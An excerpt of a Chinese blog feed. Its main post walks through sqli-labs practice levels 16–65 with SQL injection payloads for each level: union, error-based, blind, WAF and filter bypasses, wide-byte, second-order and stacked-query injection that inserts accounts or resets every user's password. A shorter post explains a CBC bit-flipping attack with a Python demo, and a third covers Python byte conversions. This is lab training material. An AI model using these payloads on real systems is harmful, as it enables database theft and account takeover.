class="headerlink" title="第十六关"></a>第十六关</h2><p>与第十五关类似，区别在于id用<code>(&quot;&quot;)</code>包裹<br><code>uname=1&quot;) or 1=1 %23&amp;passwd=</code></p><h2 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h2><p><strong>update注入</strong><br>场景可以想象成，我们是一个用户在自己的修改密码页面，进行update注入获得数据信息<br>猜测语句<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39;</code><br>1.测试包裹情况<br><code>uname=admin&#39;&amp;passwd=1</code><br>检测到黑客攻击，应该对uname注入点防范严格<br><code>uname=admin&amp;passwd=1&#39;</code><br>出现报错，password存在注入，password应该用<code>&#39;&#39;</code>包裹<br>2.可以通过and (报错函数)进行爆数据<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39; and (报错函数)</code><br>因此可以构造payload<br><code>update users set password=&#39;?&#39; where username=&#39;?&#39; and (报错函数)</code><br>对于concat类型报错，需要用<code>select 1 from (报错函数)b</code>进行构造<br>payload:<code>uname=admin&amp;passwd=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b)%23</code><br>3.时间类型注入<br><code>uname=admin&amp;passwd=2&#39; and if(length((select password from security.users limit 0,1))&gt;0,sleep(0.1),1)%23</code><br>可以写脚本爆数据，但是没法爆修改表的数据，所以有一定缺陷，不知道怎么绕过</p><h2 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h2><p><strong>http头+insert注入</strong><br>场景：已知自己账号的情况下，服务器随意将用户浏览器添加到数据库中<br>1.看到User-Agent回显，猜测语句<br><code>insert into uagents (uagent, ip_address, username`) VALUES (&#39;?&#39;, &#39;ip&#39;, &#39;name&#39;)</code><br>判断包裹<br><code>{&#39;User-Agent&#39;:&quot;1&#39; and sleep(3) and &#39;1&#39;=&#39;1&quot;}</code><br>可以发现存在注入，id包裹为<code>&#39;&#39;</code><br>2.编写脚本爆数据<br>睡眠语句应该插入在VALUES字段当中才有效果，且前面值必须为True<br>3.注<br>一般http头注入通过编写脚本会更直观一些</p><h2 id="第十九关"><a href="#第十九关" class="headerlink" title="第十九关"></a>第十九关</h2><p>与第十八关类似，区别在于http头为Rerferer<br><code>{&#39;Rerferer&#39;:&quot;1&#39; and sleep(3) and &#39;1&#39;=&#39;1&quot;}</code></p><h2 id="第二十关"><a href="#第二十关" class="headerlink" title="第二十关"></a>第二十关</h2><p><strong>使用Cookie进行查询的注入</strong><br>场景，通过cookie来查询数据库获得用户信息<br>1.测试cookie，可以发现存在越权<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&quot;}</code><br>登录为Dumb<br><code>{&#39;Cookie&#39;:&quot;uname=Admin&quot;}</code><br>登录为Admin<br>2.插入<code>\</code><br>出现报错，可以判断出id包裹为<code>&#39;&#39;</code><br>3.无法判断后台语句，可能是插入或者查询<br>我们尝试通用sleep语句来测试<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&#39; and sleep(3) #&quot;}</code><br>可以发现延迟了3秒钟，因而存在注入<br><code>{&#39;Cookie&#39;:&quot;uname=Dumb&#39; and 1=1 #&quot;}</code><br>这个payload也可以判断出布尔注入<br><code>uname=1&#39; union select 1,2,3 #</code><br>这个payload也可以判断出union注入<br>4.编写脚本或者使用报错函数都可以</p><h2 id="第二十一关"><a href="#第二十一关" class="headerlink" title="第二十一关"></a>第二十一关</h2><p><strong>经过base64处理过的cookie查询注入</strong><br>1.测试cookie<br>通过base64解码，得到明文Dumb<br>2.插入’\’<br><code>1\</code><br>经过base64编码，插入cookie中<br>可以发现报错，得到cookie用<code>(&#39;&#39;)</code>来包裹<br>3.payload<br><code>-1&#39;) union select 1,database(),3 #</code></p><h2 id="第二十二关"><a href="#第二十二关" class="headerlink" title="第二十二关"></a>第二十二关</h2><p>与第二十一关类似，区别在于cookie用<code>&quot;&quot;</code>包裹<br><code>-1&quot; union select 1,database(),3 #</code></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通常意义上的普通注入，从输入点分类有GET注入、POST注入、http头注入，从获取数据方式，有union注入、报错注入、布尔盲注、时间注入，从数据库操作方式有select注入、update注入、insert注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第一关&quot;&gt;&lt;a href=&quot;#第一关&quot; class=&quot;headerlink&quot; title=&quot;第一关&quot;&gt;&lt;/a&gt;第一关&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;union 注入&lt;/strong&gt;&lt;br&gt;1.插入转义字符查看报错&lt;br&gt;&lt;code&gt;1\&lt;/code&gt;&lt;br&gt;Yo
      
    
    </summary>
    
      <category term="技术小卖铺" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%B0%8F%E5%8D%96%E9%93%BA/"/>
    
    
      <category term="靶场" scheme="http://yoursite.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs通过2</title>
    <link href="http://yoursite.com/2019/08/17/sqli-labs%E9%80%9A%E8%BF%872/"/>
    <id>http://yoursite.com/2019/08/17/sqli-labs通过2/</id>
    <published>2019-08-17T15:15:58.000Z</published>
    <updated>2019-08-17T15:15:58.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第二十三关"><a href="#第二十三关" class="headerlink" title="第二十三关"></a>第二十三关</h2><p><strong>过滤了注释</strong><br>1.插入<code>\</code>判断包裹<br><code>1\</code><br>通过报错可以发现，id由<code>&#39;&#39;</code>包裹<br>2.and再次判断<br><code>1&#39; and 1=1 %23</code><br>发现报错，系统可能对注释符有过滤，再次试验<code>\*</code>、<code>--</code>、<code>#</code>都失败，应该是都过滤了<br>3.绕过过滤<br><code>1&#39; and 1=1 and &#39;1&#39;=&#39;1</code>绕过<br><code>1&#39; and 1=1 and &#39;1</code><br><code>1&#39; union select 1,2,&#39;3</code><br>可以在where后面处以True为闭合，也可以作为union的一个字段进行闭合<br>4.payload<br>(1)<code>-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata where 1 and &#39;1</code><br>(2)<code>-1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),&#39;3</code>这个不用where</p><h2 id="第二十四关"><a href="#第二十四关" class="headerlink" title="第二十四关"></a>第二十四关</h2><p><strong>二次注入</strong><br>1.测试登录页面<br>猜测语句<br><code>select * from users where username=&#39;?&#39; and password=&#39;?&#39;</code><br>注入<br><code>1\</code><br>用户名和密码都不存在注入<br>2.测试用户注册页面<br>猜测语句<br><code>insert into users(username,password) values (?,?)</code><br>注入<br><code>1&quot; and sleep(3)</code><br>用户注册界面也不存在注入<br>可以判断都进行了单引号和双引号的转义<br>3.测试修改密码页面<br>猜测语句<br><code>update users set password=? where username=&#39;?&#39;</code><br>注册一个畸形用户<br><code>admin&#39;#</code><br>数据库二次调用我们的用户名，并拼接到update语句后<br>update对自己数据的数据没进行过滤而生成二次注入，绕过mysql_real_escape。<br>因而可以实现任意用户密码修改<br><code>1&#39; or 1=1 #</code><br>可以实现所有用户密码更改</p><h2 id="第二十五关"><a href="#第二十五关" class="headerlink" title="第二十五关"></a>第二十五关</h2><p><strong>过滤了and与or</strong><br>1.插入<code>\</code><br>报错，可以发现id由<code>&#39;&#39;</code>包裹<br>2.and测试<br><code>1&#39; and 1=1 %23</code><br>发现and被过滤了<br>3.or测试<br><code>-1&#39; or 1 %23</code><br><code>-1&#39; or 0 %23</code><br>发现or也被过滤了<br>4.大小写绕过测试<br><code>1&#39; And 1=1 %23</code><br>无法绕过<br>5.双写绕过<br><code>1&#39; anandd 1=1 %23</code><br>成功绕过<br>6.符号绕过<br><code>1&#39; %26%26 1=2 %23</code><br>%26是&amp;，也能成功绕过<br>7.爆数据<br>information里面有or依然会被过滤，这里只有用双写绕过<br><code>-1&#39; union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata %23</code></p><h2 id="第二十五关a"><a href="#第二十五关a" class="headerlink" title="第二十五关a"></a>第二十五关a</h2><p>与第二十关类似，区别在于id没有任何包裹，并且该关没有报错<br><code>-1 union select 1,group_concat(schema_name),3 from infoorrmation_schema.schemata%23</code></p><h2 id="第二十六关"><a href="#第二十六关" class="headerlink" title="第二十六关"></a>第二十六关</h2><p><strong>过滤了空格、注释，and、or可以绕过</strong><br>1.插入<code>\</code>被过滤了，只能插入<code>&#39;</code><br><code>1&#39;</code>，通过报错可以发现id包裹为<code>&#39;&#39;</code><br>2.再次测试是否正确<br><code>1&#39;anandd&#39;0</code><br>发现确实存在注入<br>3.第一次测试通过括号绕过空格来进行union注入，失败了<br>如：<code>SELECT * FROM users WHERE id=&#39;1&#39;union(select(1),2,3)&#39;</code><br>括号后始终有<code>&#39;</code>无法删除掉，想通过order by，但是因为是两个关键字也无能为力<br>4.只好通过空格配合报错注入进行获取数据<br><code>1&#39;anandd(select(1),updatexml(1,concat(0x7e,database(),0x7e),1),2)anandd&#39;1</code><br>5.查询database()容易，复杂查询需要配合group_concat和substr进行报错查询<br><code>1&#39;anandd(select(1),updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),30,35))from(infoorrmation_schema.schemata)),0x7e),1),2)anandd&#39;1</code><br>6.附<br>网上的payload主要是通过<code>%0A-D</code>、<code>%A0</code>、<code>%09</code>进行替换空格来获取数据，遗憾的是我的环境不行，所以只好想出上述方法</p><h2 id="第二十六关a"><a href="#第二十六关a" class="headerlink" title="第二十六关a"></a>第二十六关a</h2><p>与二十六关过滤类似，但是没有报错<br>因而我们就无法像二十六关一样使用报错注入，但是依然可以使用布尔盲注<br><code>1&#39;anandd(ascii(substr((select(substr(group_concat(schema_name),1,35))from(infoorrmation_schema.schemata)),1,1))&gt;0)anandd&#39;1</code><br>然后写脚本爆破</p><h2 id="第二十七关"><a href="#第二十七关" class="headerlink" title="第二十七关"></a>第二十七关</h2><p><strong>union和select和空格过滤</strong><br>union和select和双拼或者大小写绕过，payload构造思路与二十五关类似<br><code>1&#39;and(select(1),updatexml(1,concat(0x7e,(SElect(substr(group_concat(schema_name),30,35))from(information_schema.schemata)),0x7e),1),2)and&#39;1</code></p><h2 id="第二十七a关"><a href="#第二十七a关" class="headerlink" title="第二十七a关"></a>第二十七a关</h2><p>与二十七类似，区别在于取消报错和包裹为<code>&quot;&quot;</code><br>可以使用类似二十六关a的payload进行布尔盲注<br><code>1&quot;and(ascii(substr((SElect(substr(group_concat(schema_name),1,35))from(information_schema.schemata)),1,1))&gt;0)and&quot;1</code></p><h2 id="第二十八关"><a href="#第二十八关" class="headerlink" title="第二十八关"></a>第二十八关</h2><p>有点看不懂这题的过滤，感觉就是过滤了空格，题目所说的过滤union select并没看出效果<br>直接用普通的布尔盲注即可<br><code>1&#39;and(ascii(substr((select(substr(group_concat(schema_name),1,35))from(information_schema.schemata)),1,1))&gt;0)and&#39;1</code></p><h2 id="第二十八a关"><a href="#第二十八a关" class="headerlink" title="第二十八a关"></a>第二十八a关</h2><p>同样看不懂，感觉与二十八关一模一样<br>直接用二十八关payload即可</p><h2 id="第二十九关"><a href="#第二十九关" class="headerlink" title="第二十九关"></a>第二十九关</h2><p><strong>tomcat的waf</strong><br>1.测试一些垃圾字符<br><code>1&#39;</code><br>发现全都被过滤了，只有数字才能成功访问<br>2.多个参数请求绕过waf<br><code>1&amp;id=1&#39; and 1=1 %23</code><br>3.payload<br><code>id=1&amp;id=-1&#39; union select 1,database(),3 %23</code><br>4.总结<br>源码关键点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String id = request.getParameter(&quot;id&quot;);</span><br><span class="line">String rex = &quot;^\\d+$&quot;;</span><br></pre></td></tr></table></figure></p><p>jsp的request.getParameter只获得第一个请求参数，因而他也只对第一个参数做了正则过滤，而php对于多个参数的请求，优先获得后面一个参数的值，因而在jsp和php中存在差异，造成漏洞。</p><h2 id="第三十关"><a href="#第三十关" class="headerlink" title="第三十关"></a>第三十关</h2><p>与第二十九关类似，区别在于id包裹变为<code>&quot;&quot;</code>，并且不报错<br><code>1&amp;id=-1&quot; union select 1,database(),3 %23</code></p><h2 id="第三十一关"><a href="#第三十一关" class="headerlink" title="第三十一关"></a>第三十一关</h2><p>与第三十关类似，去吧在于id包裹变为<code>(&quot;&quot;)</code><br><code>-1&quot;) union select 1,database(),3 %23</code></p><h2 id="第三十二关"><a href="#第三十二关" class="headerlink" title="第三十二关"></a>第三十二关</h2><p><strong>宽字节注入</strong><br>1.各种坏字符插入<br><code>1&#39;</code><br>都能正常显示，无法注入<br>2.插入宽字节<br><code>1%bf&#39;</code><br>报错，可以得知id包裹为<code>&#39;&#39;</code><br>3.爆数据<br><code>-1%bf&#39; union select 1,database(),3 %23</code><br>4.总结<br>数据后台编码使用的如果是GBK，那么两个字节才为一个中文，同时php对于坏字符的过滤通常是在前面加注释符，因此前面拼接一个%bf可以将\吃掉。</p><h2 id="第三十三关"><a href="#第三十三关" class="headerlink" title="第三十三关"></a>第三十三关</h2><p>与上一关payload一样，区别在于源代码对于过滤的函数有所不同。<br><code>-1%bf&#39; union select 1,database(),3 %23</code></p><h2 id="第三十四关"><a href="#第三十四关" class="headerlink" title="第三十四关"></a>第三十四关</h2><p>改成post类型，原理一样<br><code>uname=-1%bf&#39; union select 1,database() %23&amp;passwd=</code></p><h2 id="第三十五关"><a href="#第三十五关" class="headerlink" title="第三十五关"></a>第三十五关</h2><p>与前几关类似，区别在于id没有进行包裹<br>因而那些过滤都是无效的<br><code>-1 union select 1,database(),3 %23</code></p><h2 id="第三十六关"><a href="#第三十六关" class="headerlink" title="第三十六关"></a>第三十六关</h2><p>和三十二关几乎一样<br><code>-1%bf&#39; union select 1,database(),3 %23</code></p><h2 id="第三十七关"><a href="#第三十七关" class="headerlink" title="第三十七关"></a>第三十七关</h2><p>与三十四关几乎一样<br><code>uname=-1%bf&#39; union select 1,database() %23&amp;passwd=2</code></p><h2 id="第三十八关"><a href="#第三十八关" class="headerlink" title="第三十八关"></a>第三十八关</h2><p><strong>堆叠注入</strong><br>操作与第一关类似，关键在于该关可以用<code>;</code>闭合然后执行任意语句，想想都恐怖。</p><h2 id="第三十九关"><a href="#第三十九关" class="headerlink" title="第三十九关"></a>第三十九关</h2><p>与三十八关一样，区别在于id没有包裹<br><code>1;insert into users(username,password) values (&#39;bu1uokage&#39;,&#39;bu1uokage&#39;)%23</code></p><h2 id="第四十关"><a href="#第四十关" class="headerlink" title="第四十关"></a>第四十关</h2><p>与三十八关一样，区别在于id包裹为<code>(&#39;&#39;)</code><br><code>1&#39;);insert into users(username,password) values (&#39;kage&#39;,&#39;kage&#39;)%23</code></p><h2 id="第四十一关"><a href="#第四十一关" class="headerlink" title="第四十一关"></a>第四十一关</h2><p>与三十八关一样，区别在于id没有包裹<br><code>1;insert into users(username,password) values (&#39;bu1uokage&#39;,&#39;bu1uokage&#39;)%23</code></p><h2 id="第四十二关"><a href="#第四十二关" class="headerlink" title="第四十二关"></a>第四十二关</h2><p>1.插入坏字符<br>username和password插入坏字符，发现报错<br>可以判断password包裹为<code>&#39;&#39;</code><br>2.堆叠注入插数据<br>    <code>login_user=&amp;login_password=1&#39; or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十三关"><a href="#第四十三关" class="headerlink" title="第四十三关"></a>第四十三关</h2><p>与第四十二关一样，区别在于password用<code>(&#39;&#39;)</code>包裹<br><code>login_user=1&amp;login_password=1&#39;) or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十四关"><a href="#第四十四关" class="headerlink" title="第四十四关"></a>第四十四关</h2><p>与第四十二关一样，区别在于没有报错<br><code>login_user=&amp;login_password=1&#39; or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十五关"><a href="#第四十五关" class="headerlink" title="第四十五关"></a>第四十五关</h2><p>与第四十三关一样，区别在于没有报错<br><code>login_user=1&amp;login_password=1&#39;) or 1=1;insert into users(username,password)values(&#39;buu&#39;,&#39;buu&#39;) %23</code></p><h2 id="第四十六关"><a href="#第四十六关" class="headerlink" title="第四十六关"></a>第四十六关</h2><p><strong>order by 注入</strong><br>1.desc测试有无注入<br><code>1 desc</code>和<code>1 asc</code><br>存在不同，可以发现该网页存在order by注入<br>2.报错注入<br><code>(select 1,updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1),2)</code><br>3.rand(True)与rand(False)的布尔注入<br>通过判断表中第一个数据的不同可以进行注入，需要使用Beautifulsoup<br><code>rand(ascii(substr((select password from users limit 0,1),1,1))&lt;79)</code><br>4.时间注入<br><code>if(length((select password from users limit 0,1))&gt;0,sleep(5),1)</code><br>时间注入性能较低，但依然可以用<br>5.procedure analyse类型的报错注入<br><code>1%27procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1)--+</code></p><h2 id="第四十七关"><a href="#第四十七关" class="headerlink" title="第四十七关"></a>第四十七关</h2><p><strong>字符串类型的order by注入</strong><br>不清楚order by后面的字段带字符串什么意思<br>1.sleep测试有无注入<br><code>1&#39; and sleep(3) %23</code><br>有延时，发现存在注入<br>2.通过报错注出数据<br><code>1&#39; and (select 1,updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1),2) %23</code><br>3.通过时间脚本注入数据<br><code>1&#39; and if(length((select password from users limit 0,1))&gt;0,sleep(5),1) %23</code></p><h2 id="第四十八关"><a href="#第四十八关" class="headerlink" title="第四十八关"></a>第四十八关</h2><p>与46关几乎一样，就是不报错了<br>除了报错注入其他方法都行<br><code>rand(length((select password from users limit 0,1))&gt;0)</code></p><h2 id="第四十九关"><a href="#第四十九关" class="headerlink" title="第四十九关"></a>第四十九关</h2><p>与第47关一样，就是不报错了<br><code>1&#39; and if(length((select password from users limit 0,1))&gt;0,sleep(5),1) %23</code></p><h2 id="第五十关"><a href="#第五十关" class="headerlink" title="第五十关"></a>第五十关</h2><p><strong>order by类型的堆叠注入</strong><br><code>1;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)</code><br>不懂堆叠注入的意义，但题目就这么出的</p><h2 id="第五十一关"><a href="#第五十一关" class="headerlink" title="第五十一关"></a>第五十一关</h2><p>还是堆叠注入，字符型的<br><code>1&#39;;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)%23</code></p><h2 id="第五十二关"><a href="#第五十二关" class="headerlink" title="第五十二关"></a>第五十二关</h2><p>还是堆叠注入<br><code>1;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)</code></p><h2 id="第五十三关"><a href="#第五十三关" class="headerlink" title="第五十三关"></a>第五十三关</h2><p>还是堆叠注入，字符型的<br><code>1&#39;;insert into users(username,password) values (&#39;123&#39;,&#39;123&#39;)%23</code></p><h2 id="第五十四关"><a href="#第五十四关" class="headerlink" title="第五十四关"></a>第五十四关</h2><p>数字类型，union注入<br>table<br><code>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</code><br>字段<br><code>union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;e6ee4wjw6q&#39; %23</code></p><h2 id="第五十五关"><a href="#第五十五关" class="headerlink" title="第五十五关"></a>第五十五关</h2><p>()，union注入</p><h2 id="第五十六关"><a href="#第五十六关" class="headerlink" title="第五十六关"></a>第五十六关</h2><p>(‘’)，union注入</p><h2 id="第五十七关"><a href="#第五十七关" class="headerlink" title="第五十七关"></a>第五十七关</h2><p>“”，union注入</p><h2 id="第五十八关"><a href="#第五十八关" class="headerlink" title="第五十八关"></a>第五十八关</h2><p>报错注入<br><code>select 1 from (select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;s3xs3kw3kw&#39; limit 2,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b</code><br>表<br><code>select 1 from (select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b</code><br>字段<br><code>(select column_name from information_schema.columns where table_name=&#39;s3xs3kw3kw&#39; limit 2,1)</code></p><h2 id="第五十九关"><a href="#第五十九关" class="headerlink" title="第五十九关"></a>第五十九关</h2><p>与第五十九关类似，数字型报错注入</p><h2 id="第六十关"><a href="#第六十关" class="headerlink" title="第六十关"></a>第六十关</h2><p>与第五十九关类似，<code>(&quot;&quot;)</code></p><h2 id="第六十一关"><a href="#第六十一关" class="headerlink" title="第六十一关"></a>第六十一关</h2><p>有第五十九关类似，<code>((&#39;&#39;))</code></p><h2 id="第六十二关"><a href="#第六十二关" class="headerlink" title="第六十二关"></a>第六十二关</h2><p><code>(&#39;&#39;)</code>，布尔注入</p><h2 id="第六十三关"><a href="#第六十三关" class="headerlink" title="第六十三关"></a>第六十三关</h2><p><code>&#39;&#39;</code>，布尔植入</p><h2 id="第六十四关"><a href="#第六十四关" class="headerlink" title="第六十四关"></a>第六十四关</h2><p><code>(())</code>，布尔注入</p><h2 id="第六十五关"><a href="#第六十五关" class="headerlink" title="第六十五关"></a>第六十五关</h2><p><code>(&quot;&quot;)</code>，布尔注入</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;第二十三关&quot;&gt;&lt;a href=&quot;#第二十三关&quot; class=&quot;headerlink&quot; title=&quot;第二十三关&quot;&gt;&lt;/a&gt;第二十三关&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;过滤了注释&lt;/strong&gt;&lt;br&gt;1.插入&lt;code&gt;\&lt;/code&gt;判断包裹&lt;br&gt;&lt;code&gt;
      
    
    </summary>
    
      <category term="技术小卖铺" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%B0%8F%E5%8D%96%E9%93%BA/"/>
    
    
      <category term="靶场" scheme="http://yoursite.com/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CBC翻转字节攻击</title>
    <link href="http://yoursite.com/2019/08/15/CBC%E7%BF%BB%E8%BD%AC%E5%AD%97%E8%8A%82%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/08/15/CBC翻转字节攻击/</id>
    <published>2019-08-15T13:17:06.000Z</published>
    <updated>2019-08-15T13:17:06.902Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CBC模式"><a href="#CBC模式" class="headerlink" title="CBC模式"></a>CBC模式</h2><p><img src="/img/1565873423512.png" alt=""><br>加密过程：将Plaintext分成多组，每组16个字节，第一轮与IV进行异或，然后加密，再将第一组密文与第二组plantext进行异或，再进行加密<br>解密过程：与加密过程相反，先将密文解密，再与前一组密文异或，第一轮是先解密再与IV异或</p><p><strong>对于解密：</strong><br>设明文为X，密文为Y，解密函数为k<br>X[i] = k(Y[i]) Xor Y[i-1]<br><strong>对于第一组：</strong><br>X[1] = k(Y[1]) Xor IV</p><h2 id="CBC翻转攻击"><a href="#CBC翻转攻击" class="headerlink" title="CBC翻转攻击"></a>CBC翻转攻击</h2><p>如果客户知道明文X、密文Y和IV，并可以对其进行修改，那么可以实现CBC翻转攻击，使得后台解密得到的明文可以让我们所控制。<br><strong>控制X[i]：</strong><br>令Y[i-1] = Y[i-1] Xor X[i]，那么能够使得X[i] = 0<br>令Y[i-1] = Y[i-1] Xor X[i] Xor A，那么能够使得X[i] = A<br>控制前一组密文与当前明文异或可以使得解密为0，再异或一个值，我们就可以对其进行控制<br><strong>控制X[1]：</strong><br>令IV = IV Xor X[1]，使得X[1] = 0<br>令IV = IV Xor X[1] Xor A，使得X[1] = A<br>要控制第一组，需要对IV进行修改</p><h2 id="脚本测试"><a href="#脚本测试" class="headerlink" title="脚本测试"></a>脚本测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from binascii import b2a_hex,a2b_hex</span><br><span class="line"></span><br><span class="line">def encrypt(iv,plaintext):</span><br><span class="line">if len(plaintext)%16 != 0:</span><br><span class="line">print(&quot;plaintext length is invalid&quot;)</span><br><span class="line">return</span><br><span class="line">if len(iv) != 16:</span><br><span class="line">print(&quot;IV length is invalid&quot;)</span><br><span class="line">return</span><br><span class="line">key = &quot;1234567890123456&quot;</span><br><span class="line">aes_encrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line">return b2a_hex(aes_encrypt.encrypt(plaintext))</span><br><span class="line"></span><br><span class="line">def decrypt(iv,cipher):</span><br><span class="line">if len(iv) != 16:</span><br><span class="line">print(&quot;IV length is invalid&quot;)</span><br><span class="line">return</span><br><span class="line">key = &quot;1234567890123456&quot;</span><br><span class="line">aes_decrypt = AES.new(key,AES.MODE_CBC,IV=iv)</span><br><span class="line">return b2a_hex(aes_decrypt.decrypt(a2b_hex(cipher)))</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">iv = &quot;ABCDEFGH12345678&quot;</span><br><span class="line">plaintext = &quot;0123456789ABCDEFhellocbcflipping&quot;</span><br><span class="line">cipher = encrypt(iv,plaintext)</span><br><span class="line">print(cipher)</span><br><span class="line">de_cipher = decrypt(iv,cipher)</span><br><span class="line">print(de_cipher)</span><br><span class="line">print(a2b_hex(de_cipher))</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">bin_cipher = bytearray(a2b_hex(cipher))</span><br><span class="line">bin_cipher[15] = bin_cipher[15] ^ ord(&apos;g&apos;) ^ ord(&apos;G&apos;)</span><br><span class="line">de_cipher = decrypt(iv,b2a_hex(bin_cipher))</span><br><span class="line">print(de_cipher)</span><br><span class="line">print(a2b_hex(de_cipher))</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line">bin_decipher = bytearray(a2b_hex(de_cipher))</span><br><span class="line">bin_iv = bytearray(iv.encode(&apos;ascii&apos;))</span><br><span class="line">for i in range(0,len(iv)):</span><br><span class="line">bin_iv[i] = bin_iv[i] ^ bin_decipher[i] ^ ord(&apos;X&apos;)</span><br><span class="line"></span><br><span class="line">de_cipher = decrypt(bytes(bin_iv),b2a_hex(bin_cipher))</span><br><span class="line">print(de_cipher)</span><br><span class="line">print(a2b_hex(de_cipher))</span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CBC模式&quot;&gt;&lt;a href=&quot;#CBC模式&quot; class=&quot;headerlink&quot; title=&quot;CBC模式&quot;&gt;&lt;/a&gt;CBC模式&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/1565873423512.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;加密过程：将Plainte
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>python中byte、str和bytearray相互转换</title>
    <link href="http://yoursite.com/2019/08/11/python%E4%B8%ADbyte%E3%80%81str%E5%92%8Cbytearray%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2/"/>
    <id>http://yoursite.com/2019/08/11/python中byte、str和bytearray相互转换/</id>
    <published>2019-08-11T05:39:27.000Z</published>
    <updated>2019-08-11T05:39:27.449Z</updated>
    
    <content type="html"><![CDATA[<h2 id="三者用途"><a href="#三者用途" class="headerlink" title="三者用途"></a>三者用途</h2><p>首先str是采用Unicode编码方式的序列，主要用于显示。<br>而bytes是字节序列，主要用于网络和文件传输。<br>bytearray和bytes是一样的，只是它是可变的，它们的关系和str与list类似。<br>在aes解密或者网络数据中，数据应该是bytes或bytearray。</p><h2 id="str-和-byte"><a href="#str-和-byte" class="headerlink" title="str 和 byte"></a>str 和 byte</h2><p><code>str = &#39;asdf&#39;.encode(&#39;utf-8&#39;)</code><br><code>byte = b&#39;asdf&#39;.decode(&#39;utf-8&#39;)</code></p><h2 id="byte-和-byetearray"><a href="#byte-和-byetearray" class="headerlink" title="byte 和 byetearray"></a>byte 和 byetearray</h2><p><code>byte = bytearray(b&#39;asdf&#39;)</code><br><code>byte = byte(bytearray(b&#39;asdf&#39;))</code></p><h2 id="str-和-bytearray"><a href="#str-和-bytearray" class="headerlink" title="str 和 bytearray"></a>str 和 bytearray</h2><p><code>bytearray = bytearray(&#39;asdf&#39;,&#39;utf-8&#39;)</code><br><code>str = bytearray.decode(&#39;utf-8&#39;)</code></p>]]></content>
    
    <summary type="html">
    
      
      
